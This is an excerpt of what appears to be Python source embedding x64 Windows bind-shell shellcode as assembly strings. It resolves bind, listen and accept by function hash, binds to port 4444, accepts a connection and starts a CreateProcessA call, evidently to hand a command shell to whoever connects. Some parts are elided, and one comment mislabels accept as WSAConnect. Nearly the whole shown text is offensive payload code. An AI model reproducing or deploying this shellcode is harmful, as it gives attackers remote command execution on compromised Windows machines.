...
CODE = (
    ...
    "   mov   r10d,  0xc7701aa4         ;"  #   bind hash
    "   call r15                        ;"  #   Call find_function
    "   mov   [rbp+0x30], rax           ;"  #   Save bind address for later usage
    "   mov   r10d,  0xe92eada4                ;"  #   listen hash
    "   call r15                        ;"  #   Call find_function
    "   mov   [rbp+0x38], rax           ;"  #   Save listen address for later usage
    "   mov   r10d, 0x498649e5                ;"  #   accept hash
    "   call r15                        ;"  #   Call find_function
    "   mov   [rbp+0x40], rax           ;"  #   Save WSAConnect address for later usage
    ...
    "   xor rax, rax                    ;"
    "   push rax                        ;" # sockaddr_in-->sin_zero[8]
    "   mov eax, 0xa3eefffe             ;" # sin_port(4444) + sin_family(0x0002)
    "   neg eax                         ;"  # RAX = listen addr + spin_port + sin_family
    "   push rax                        ;"
    "   mov rDx, rsp                    ;" # RDX = sockaddr struct
    "   xor r8, r8                      ;"
    "   add r8b, 0x10                   ;" # Set namelen = 0x10 = size of sockaddr_in
    "   sub   rsp, 0x20                 ;"
    "   call qword ptr [rbp + 0x30]     ;"  #   Call bind(SOCKET, SOCKADDR, NAMELEN)
    "   add   rsp, 0x20                 ;"

    "call_listen:                       ;"
    "   xor rdx, rdx                    ;"
    "   mov edx, 0x7fffffff             ;"  # backlog
    "   mov rcx, r14                    ;"
    "   sub   rsp, 0x20                 ;"
    "   call qword ptr [rbp + 0x38]     ;"  # listen(socket, backlog)
    "   add   rsp, 0x20                 ;"
    
    "call_accept:                       ;"
    "   xor rdx, rdx                    ;" # sockaddr
    "   xor r8, r8                      ;" # addrlen
    "   mov rcx, r14                    ;"
    "   sub   rsp, 0x20                 ;"
    "   call qword ptr [rbp + 0x40]     ;"  # accept(socket, sockaddr, addrlen)
    "   add   rsp, 0x20                 ;"
    "   mov r14, RAX                    ;" # store new socket

   " call_CreateProcessA:                "
   "    xor rcx, rcx                     ;"
    "   ADD   SP,0x228                   ;" # shift stack up to reuse allocated space
    "   xor   r8, r8                     ;"
